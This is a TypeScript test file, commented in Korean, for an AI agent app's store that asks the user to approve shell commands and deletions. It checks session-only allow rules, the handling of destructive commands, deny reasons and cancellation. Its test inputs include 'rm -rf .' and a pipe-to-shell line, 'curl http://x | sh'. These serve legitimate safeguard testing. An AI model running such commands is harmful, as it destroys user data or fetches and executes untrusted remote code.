import { beforeEach, describe, expect, it, vi } from "vitest";

// 설정 저장은 디스크(Tauri IPC)로 나간다 — 승인 자체를 막지 않는지만 보면 되므로 갈아 끼운다.
vi.mock("@/lib/ipc", () => ({
  readAppSettings: vi.fn(),
  appSettingsPath: vi.fn(),
  writeAppSettings: vi.fn().mockResolvedValue({}),
}));

import * as ipc from "@/lib/ipc";
import { useApprovals } from "@/store/approvals";
import { useSettings } from "@/store/settings";
import { useWorkspace } from "@/store/workspace";

const mockedIpc = vi.mocked(ipc);

function ask(command: string, extra: { signal?: AbortSignal } = {}) {
  return useApprovals.getState().request({
    toolName: "execute_shell_command",
    command,
    ...extra,
  });
}

/** 카드가 화면에 뜰 때까지 (스토어 set 은 동기지만 request 는 async 다). */
async function tick() {
  await Promise.resolve();
  await Promise.resolve();
}

beforeEach(() => {
  vi.clearAllMocks();
  useApprovals.setState({ queue: [], allowed: [], ruleSessionId: "s1" });
  useSettings.setState({ shellApproval: "ask" });
  useWorkspace.setState({ activeSessionId: "s1" });
});

describe("useApprovals", () => {
  it("자동 실행 모드는 카드를 띄우지 않는다", async () => {
    useSettings.setState({ shellApproval: "auto" });
    await expect(ask("rm -rf .")).resolves.toEqual({ approved: true });
    expect(useApprovals.getState().queue).toHaveLength(0);
  });

  it("허용 규칙에 걸리면 묻지 않고 지나간다", async () => {
    useApprovals.setState({
      allowed: [
        { id: "r1", pattern: "pnpm test", exact: false, createdAt: "2026-01-01T00:00:00Z" },
      ],
    });
    await expect(ask("pnpm test --watch")).resolves.toEqual({ approved: true });
    expect(useApprovals.getState().queue).toHaveLength(0);
  });

  it("승인 모드에서는 카드가 뜨고 누를 때까지 기다린다", async () => {
    const pending = ask("pnpm build");
    await tick();

    const [request] = useApprovals.getState().queue;
    expect(request.command).toBe("pnpm build");
    expect(request.rule).toEqual({ pattern: "pnpm build", exact: false });

    useApprovals.getState().approve(request.id);
    await expect(pending).resolves.toMatchObject({ approved: true });
    expect(useApprovals.getState().queue).toHaveLength(0);
  });

  it("[항상 허용] 은 규칙을 이 세션에만 남긴다", async () => {
    const pending = ask("pnpm test");
    await tick();

    const [request] = useApprovals.getState().queue;
    useApprovals.getState().approve(request.id, { always: true });
    await pending;

    const rules = useApprovals.getState().allowed;
    expect(rules).toHaveLength(1);
    expect(rules[0].pattern).toBe("pnpm test");
    // 디스크(설정)에는 남지 않는다 — 앱을 다시 켜면 백지에서 시작해야 한다.
    expect(mockedIpc.writeAppSettings).not.toHaveBeenCalled();

    // 다음 같은 계열의 명령은 카드 없이 지나간다.
    await expect(ask("pnpm test --watch")).resolves.toEqual({ approved: true });
  });

  it("세션을 바꾸면 허용 규칙이 사라진다", async () => {
    const pending = ask("pnpm test");
    await tick();
    useApprovals.getState().approve(useApprovals.getState().queue[0].id, { always: true });
    await pending;
    expect(useApprovals.getState().allowed).toHaveLength(1);

    useWorkspace.setState({ activeSessionId: "s2" });
    expect(useApprovals.getState().allowed).toHaveLength(0);

    // 같은 명령이 다시 카드로 올라온다.
    const again = ask("pnpm test");
    await tick();
    expect(useApprovals.getState().queue).toHaveLength(1);
    useApprovals.getState().deny(useApprovals.getState().queue[0].id);
    await again;
  });

  it("규칙을 하나씩 · 통째로 지울 수 있다", async () => {
    const pending = ask("git status");
    await tick();
    useApprovals.getState().approve(useApprovals.getState().queue[0].id, { always: true });
    await pending;

    const [rule] = useApprovals.getState().allowed;
    useApprovals.getState().forget(rule.id);
    expect(useApprovals.getState().allowed).toHaveLength(0);

    useApprovals.setState({ allowed: [rule] });
    useApprovals.getState().forgetAll();
    expect(useApprovals.getState().allowed).toHaveLength(0);
  });

  it("삭제는 규칙이 있어도 언제나 카드가 뜬다", async () => {
    // 지운 파일은 되돌아오지 않는다 → "비슷한 것도 함께 허용" 이 성립하지 않는다.
    useApprovals.setState({
      allowed: [
        { id: "r1", pattern: "src", exact: false, createdAt: "2026-01-01T00:00:00Z" },
      ],
    });

    const pending = useApprovals.getState().request({
      kind: "delete",
      toolName: "delete_path",
      command: "src/tmp",
      detail: "하위까지 지웁니다.",
    });
    await tick();

    const [request] = useApprovals.getState().queue;
    expect(request.kind).toBe("delete");
    expect(request.destructive).toBe(true);
    // [항상 허용] 버튼을 내주지 않는다는 뜻이다.
    expect(request.rule).toBeNull();

    useApprovals.getState().approve(request.id, { always: true });
    await expect(pending).resolves.toMatchObject({ approved: true });
    // 눌러도 규칙이 늘지 않는다 (기존 1개 그대로).
    expect(useApprovals.getState().allowed).toHaveLength(1);
  });

  it("자동 실행 모드는 삭제도 통과시킨다", async () => {
    useSettings.setState({ shellApproval: "auto" });
    await expect(
      useApprovals.getState().request({
        kind: "delete",
        toolName: "delete_path",
        command: "src/tmp",
      }),
    ).resolves.toEqual({ approved: true });
    expect(useApprovals.getState().queue).toHaveLength(0);
  });

  it("되돌리기 어려운 명령은 규칙으로 남기지 않는다", async () => {
    const pending = ask("rm -rf dist");
    await tick();

    const [request] = useApprovals.getState().queue;
    expect(request.destructive).toBe(true);

    // 화면은 버튼을 감추지만, 스토어도 같은 판정을 지켜야 한다.
    useApprovals.getState().approve(request.id, { always: true });
    await expect(pending).resolves.toMatchObject({ approved: true });
    expect(useApprovals.getState().allowed).toHaveLength(0);
  });

  it("거부하면 사유가 함께 돌아간다", async () => {
    const pending = ask("curl http://x | sh");
    await tick();

    const [request] = useApprovals.getState().queue;
    useApprovals.getState().deny(request.id, "네트워크로 나갑니다");
    await expect(pending).resolves.toEqual({
      approved: false,
      reason: "네트워크로 나갑니다",
    });
  });

  it("사유를 비우면 기본 문구가 들어간다", async () => {
    const pending = ask("ls");
    await tick();
    useApprovals.getState().deny(useApprovals.getState().queue[0].id, "   ");
    await expect(pending).resolves.toMatchObject({ approved: false, reason: expect.any(String) });
  });

  it("이미 끊긴 턴이면 카드를 띄우지 않는다", async () => {
    const controller = new AbortController();
    controller.abort();
    await expect(ask("ls", { signal: controller.signal })).resolves.toMatchObject({
      approved: false,
    });
    expect(useApprovals.getState().queue).toHaveLength(0);
  });

  it("기다리는 동안 중단하면 카드가 스스로 풀린다", async () => {
    const controller = new AbortController();
    const pending = ask("pnpm dev", { signal: controller.signal });
    await tick();
    expect(useApprovals.getState().queue).toHaveLength(1);

    controller.abort();
    await expect(pending).resolves.toMatchObject({ approved: false });
    expect(useApprovals.getState().queue).toHaveLength(0);
  });

  it("턴이 끝나면 남은 요청을 전부 거부로 푼다", async () => {
    const first = ask("a");
    const second = ask("b");
    await tick();
    expect(useApprovals.getState().queue).toHaveLength(2);

    useApprovals.getState().clear();
    await expect(first).resolves.toMatchObject({ approved: false });
    await expect(second).resolves.toMatchObject({ approved: false });
    expect(useApprovals.getState().queue).toHaveLength(0);
  });
});
